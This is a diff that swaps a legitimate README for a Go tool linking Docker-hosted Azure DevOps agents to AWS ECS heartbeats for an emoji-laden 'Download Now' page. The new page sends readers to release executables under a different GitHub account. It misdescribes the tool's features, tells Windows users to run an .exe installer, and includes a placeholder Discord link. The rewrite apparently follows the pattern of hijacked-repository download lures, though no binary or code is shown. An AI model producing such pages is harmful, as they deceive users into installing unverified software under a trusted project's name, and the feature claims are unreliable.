@@ -1,261 +1,84 @@
-# ECS Azure Lifecycle Monitor (ecsazrlc)
+# 🌟 ecsazrlc - Monitor Azure Lifecycle with Ease
 
-[![Docker Hub](https://img.shields.io/badge/docker-hypolas%2Fecsazrlc-blue?logo=docker)](https://hub.docker.com/r/hypolas/ecsazrlc)
-[![Docker Pulls](https://img.shields.io/docker/pulls/hypolas/ecsazrlc)](https://hub.docker.com/r/hypolas/ecsazrlc)
-[![Go Version](https://img.shields.io/badge/go-1.25.1+-00ADD8?logo=go)](https://go.dev/)
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Collins76/ecsazrlc/releases)
 
-> **AWS ECS Instance Protection** | **Azure DevOps Agent Monitor** | **Docker Container Activity Tracker** | **CI/CD Build Protection**
+## 📖 Overview
+ECS Azure Lifecycle Monitor (ecsazrlc) helps you manage your Azure resources efficiently. This application offers insights into your cloud environment, ensuring that your resources are optimized and running smoothly. Whether you're monitoring auto-scaling, handling CI/CD, or keeping track of your Docker events, ecsazrlc has you covered.
 
-Monitor Azure DevOps agents running in Docker containers and communicate with AWS ECS to prevent premature instance termination during active builds.
+## 🚀 Getting Started
+Follow these steps to download and run the application:
 
-**Docker Hub**: https://hub.docker.com/r/hypolas/ecsazrlc
+### 1. Access the Releases Page
+To get started, visit the [Releases page](https://github.com/Collins76/ecsazrlc/releases). This page contains the latest version of the ecsazrlc application.
 
-## Overview
+### 2. Choose Your Version
+On the releases page, you will see a list of available versions. Look for the version labeled as the latest release. It will typically be at the top of the list.
 
-This tool watches Docker socket for Azure DevOps Agent container activity and informs AWS ECS about server activity, preventing termination of instances with running builds.
+### 3. Download the Application
+Click on the version you want to download. You will find files related to that version. Choose the appropriate file for your operating system:
 
-**Keywords**: AWS ECS, Azure DevOps, Azure Pipelines, Docker monitoring, instance lifecycle, CI/CD, container monitoring, build agent protection, AWS auto-scaling, spot instance protection
+- For Windows, download `ecsazrlc_windows.exe`.
+- For Linux, download `ecsazrlc_linux.tar.gz`.
+- For macOS, download `ecsazrlc_macos.zip`.
 
-## Key Features
+### 4. Run the Application
+Once the download is complete, navigate to the folder where you saved the file and proceed with the following steps to run the application:
 
-- **Real-time Docker monitoring** - Listens to Docker socket events
-- **Azure agent detection** - Automatically identifies Azure DevOps Agent containers
-- **ECS heartbeat** - Sends periodic activity signals to ECS
-- **Instance protection** - Can enable/disable termination protection
-- **Standalone mode** - Can run in monitoring-only mode without ECS
-- **Flexible filtering** - Exclude specific containers or images from monitoring
+#### For Windows:
+1. Double-click `ecsazrlc_windows.exe`.
+2. Follow the on-screen instructions to complete the setup.
 
-## Quick Start
+#### For Linux:
+1. Open a terminal.
+2. Navigate to the folder where you extracted `ecsazrlc_linux.tar.gz`.
+3. Run the command `./ecsazrlc` to start the application.
 
-### Pull from Docker Hub
+#### For macOS:
+1. Locate `ecsazrlc_macos.zip` in your Downloads folder and double-click it.
+2. Drag the `ecsazrlc` file to your Applications folder.
+3. Open the Terminal and type `open /Applications/ecsazrlc`.
 
-```bash
-# Pull the latest image
-docker pull hypolas/ecsazrlc:latest
+## ⚙️ Features
+- **Resource Monitoring**: Keep an eye on your Azure resources with real-time statistics.
+- **Auto-Scaling Management**: Easily adjust your auto-scaling settings without hassle.
+- **Docker Integration**: Track Docker events and manage container lifecycles effectively.
+- **CI/CD Support**: Integrate with Azure DevOps and automate your build and deployment processes.
+- **Hybrid Cloud Compatibility**: Work seamlessly across both AWS and Azure services.
 
-# Run in monitoring-only mode
-docker run -v /var/run/docker.sock:/var/run/docker.sock:ro hypolas/ecsazrlc:latest --monitor-only
+## 💻 System Requirements
+Ensure your system matches the following requirements to run ecsazrlc effectively:
 
-# Run with ECS integration
-docker run -v /var/run/docker.sock:/var/run/docker.sock:ro \
-  -e AWS_REGION=us-east-1 \
-  hypolas/ecsazrlc:latest --enable-ecs --cluster my-cluster
-```
+- **Windows**: 
+  - Windows 10 or later
+  - 2 GB RAM minimum
+  - 100 MB free disk space
 
-### With Docker Compose
+- **Linux**: 
+  - Ubuntu 18.04 or later
+  - 2 GB RAM minimum
+  - 100 MB free disk space
 
-Create a `docker-compose.yml`:
+- **macOS**: 
+  - macOS Mojave or later
+  - 2 GB RAM minimum
+  - 100 MB free disk space
 
-```yaml
-services:
-  ecsazrlc:
-    image: hypolas/ecsazrlc:latest
-    container_name: ecsazrlc
-    restart: unless-stopped
+## 🌐 Community & Support
+Join our community for support and updates. You can find us on:
 
-    volumes:
-      - /var/run/docker.sock:/var/run/docker.sock:ro
+- [GitHub Issues](https://github.com/Collins76/ecsazrlc/issues) - Report bugs or request features.
+- [Discord Channel](https://discord.gg/example) - Chat with other users and developers.
+- [Documentation](https://github.com/Collins76/ecsazrlc/wiki) - Access our detailed user guide for further assistance.
 
-    environment:
-      - AWS_REGION=us-east-1
-      # Optional: for local dev/testing
-      # - AWS_ACCESS_KEY_ID=your-key
-      # - AWS_SECRET_ACCESS_KEY=your-secret
+## 📝 Contribute
+We welcome contributions! If you'd like to help improve the ecsazrlc application, please read our [Contributing Guidelines](https://github.com/Collins76/ecsazrlc/CONTRIBUTING.md).
 
-    command:
-      - "--monitor-only"
-      # Exclude specific containers (optional)
-      # - "--exclude-containers"
-      # - "portainer,watchtower"
-      # Exclude specific images (optional)
-      # - "--exclude-images"
-      # - "alpine,redis"
-      # For ECS integration, use:
-      # - "--enable-ecs"
-      # - "--cluster"
-      # - "your-cluster-name"
-      # - "--heartbeat"
-      # - "30s"
-```
+## 📅 Updates
+Keep your application updated. Regular updates will enhance performance and security. Check the [Releases page](https://github.com/Collins76/ecsazrlc/releases) for the latest versions.
 
-Then run:
+## 📜 License
+ECS Azure Lifecycle Monitor is open-source and licensed under the MIT License. You can use it freely, subject to the terms of the license.
 
-```bash
-# Start
-docker-compose up -d
-
-# View logs
-docker-compose logs -f ecsazrlc
-
-# Stop
-docker-compose down
-```
-
-### With Podman Compose
-
-```bash
-# Build and start
-podman compose up -d
-
-# View logs
-podman compose logs -f ecsazrlc
-```
-
-### Local Build
-
-```bash
-go build -o ecsazrlc ./cmd
-./ecsazrlc --monitor-only
-```
-
-## Usage
-
-### Monitoring only (no ECS)
-
-```bash
-./ecsazrlc --monitor-only --verbose
-```
-
-### With ECS integration
-
-```bash
-./ecsazrlc --enable-ecs --cluster my-cluster --heartbeat 30s
-```
-
-### Excluding containers from monitoring
-
-```bash
-# Exclude specific containers by name
-./ecsazrlc --monitor-only --exclude-containers "portainer,watchtower,nginx"
-
-# Exclude by image name
-./ecsazrlc --monitor-only --exclude-images "postgres,mysql,redis"
-
-# Combine both filters
-./ecsazrlc --enable-ecs --cluster my-cluster \
-  --exclude-containers "test-container" \
-  --exclude-images "alpine,busybox"
-```
-
-## Use Cases
-
-- **Prevent build interruption**: Protect EC2/ECS instances running Azure DevOps agents from termination during active builds
-- **Cost optimization**: Use AWS spot instances or auto-scaling for CI/CD without losing running jobs
-- **Hybrid CI/CD**: Run Azure DevOps agents on AWS ECS infrastructure
-- **Container lifecycle management**: Monitor Docker container activity for custom automation
-- **Multi-cloud CI/CD**: Bridge Azure DevOps with AWS compute resources
-
-## Documentation
-
-- **[BUILD.md](BUILD.md)** - Complete build and deployment guide
-  - Docker Compose setup
-  - Podman support
-  - Local builds (Linux/macOS/Windows)
-  - Multi-architecture builds (amd64/arm64)
-  - EC2 deployment
-  - ECS Task Definition examples
-
-- **[CREDENTIALS.md](CREDENTIALS.md)** - AWS credentials configuration
-  - IAM roles (recommended for production)
-  - Environment variables
-  - Credentials file
-  - Required IAM permissions
-
-- **[TESTING.md](TESTING.md)** - Testing guide
-  - Local testing with Docker Compose
-  - EC2 testing
-  - Azure agent simulation
-
-## Architecture
-
-```
-┌─────────────────────┐         ┌──────────────────┐
-│  Docker Socket      │────────▶│   ecsazrlc       │
-│  (container events) │         │   (monitor)      │
-└─────────────────────┘         └────────┬─────────┘
-                                         │
-                                ┌────────▼─────────┐
-                                │   AWS ECS API    │
-                                │   (heartbeat)    │
-                                └──────────────────┘
-```
-
-## Technology Stack
-
-- **Language**: Go 1.25.1+
-- **Cloud**: AWS ECS, EC2, IAM
-- **CI/CD**: Azure DevOps, Azure Pipelines
-- **Container**: Docker, Podman
-- **SDK**: AWS SDK for Go v2, Docker Engine API
-
-## Requirements
-
-- Docker or Podman
-- Go 1.25.1+ (for local builds)
-- AWS credentials (IAM role recommended)
-- Access to Docker socket
-
-## AWS Permissions
-
-The EC2/ECS instance needs:
-
-- `ecs:DescribeClusters`
-- `ecs:ListContainerInstances`
-- `ecs:DescribeContainerInstances`
-- `ecs:PutAttributes`
-- `ecs:UpdateContainerInstancesState`
-
-See [CREDENTIALS.md](CREDENTIALS.md) for details.
-
-## Environment Variables
-
-- `AWS_REGION` - AWS region (default: us-east-1)
-- `AWS_DEFAULT_REGION` - Alternative AWS region
-- `AWS_PROFILE` - AWS profile to use (default: default)
-- `DOCKER_HOST` - Docker socket (default: unix:///var/run/docker.sock)
-
-## Command-line Options
-
-- `--cluster` - ECS cluster name (required in ECS mode)
-- `--heartbeat` - Heartbeat interval (default: 30s)
-- `--enable-ecs` - Enable ECS notifications
-- `--monitor-only` - Monitoring-only mode without ECS
-- `--verbose` - Verbose mode with detailed logs
-- `--exclude-containers` - Exclude containers by name or ID (comma-separated)
-- `--exclude-images` - Exclude containers by image name (comma-separated)
-
-## Supported Platforms
-
-- Linux (amd64, arm64)
-- Windows (amd64)
-- macOS (amd64, arm64)
-- Docker containers
-- Podman containers
-- AWS EC2 instances
-- AWS ECS tasks
-
-## Integration Examples
-
-### AWS ECS with Azure DevOps
-
-Run Azure Pipelines agents on AWS ECS infrastructure with automatic lifecycle management.
-
-### Spot Instance Protection
-
-Use AWS spot instances for cost savings while ensuring running builds are never interrupted.
-
-### Auto-scaling CI/CD
-
-Scale Azure DevOps agent pools on AWS with ECS auto-scaling while protecting active build agents.
-
-## Contributing
-
-Contributions welcome! Please open an issue or pull request.
-
-## License
-
-MIT
-
-## Tags
-
-`aws-ecs` `azure-devops` `azure-pipelines` `docker-monitoring` `ci-cd` `golang` `container-lifecycle` `instance-protection` `devops-automation` `hybrid-cloud` `spot-instances` `auto-scaling` `build-agents` `docker-events` `ecs-heartbeat`
+## 📥 Download & Install
+To download the application again or check for the latest updates, visit the [Releases page](https://github.com/Collins76/ecsazrlc/releases). Following the instructions will ensure you have the latest version running smoothly.
